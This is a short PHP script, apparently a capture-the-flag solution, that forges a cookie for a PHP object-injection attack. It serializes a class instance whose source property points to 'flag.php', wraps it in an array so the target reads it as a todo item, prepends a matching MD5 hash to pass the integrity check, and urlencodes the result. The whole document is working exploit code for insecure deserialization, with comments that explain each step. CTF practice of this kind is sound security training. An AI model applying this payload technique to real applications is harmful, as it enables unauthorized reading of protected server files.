<?php
Class GPLSourceBloater {
		public $source = "flag.php";
}


//we put the instance of the class inside an array
//cause it will be read as the array todos then our class will be read
//as it was a todo
$serialized = serialize(array(new GPLSourceBloater));

//we create the md5 hash of the serialized object
$md = md5($serialized);

//cookies must be urlencoded in order to work
echo urlencode($md . $serialized);
